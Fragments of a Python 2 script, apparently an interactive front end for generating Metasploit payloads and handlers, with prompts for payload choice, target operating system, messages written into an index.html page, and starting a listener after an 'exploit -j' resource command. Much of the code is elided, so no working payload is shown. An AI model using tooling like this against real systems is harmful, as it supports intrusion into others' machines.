...
-------------------------------------------------------------------"""
		...
		payload_seleccionado=int(raw_input("""   Select Payload:
...
-------------------------------------------------------------------"""
		print '\033[0;39m'
		mensaje1=raw_input("   Message 1: ")		
		mensaje2=raw_input("   Message 2: ")
		index="index.html"
		job=open(index,"w")	
...
exploit -j""")
		archivo.close()
		print '\033[0;39m'
		iniciar_handler=str(raw_input("   ¿Start the handler? (y/n): "))
...
-------------------------------------------------------------------"""
print '\033[0;39m'
OS_Objetivo=int(raw_input("""   Target Operating System:
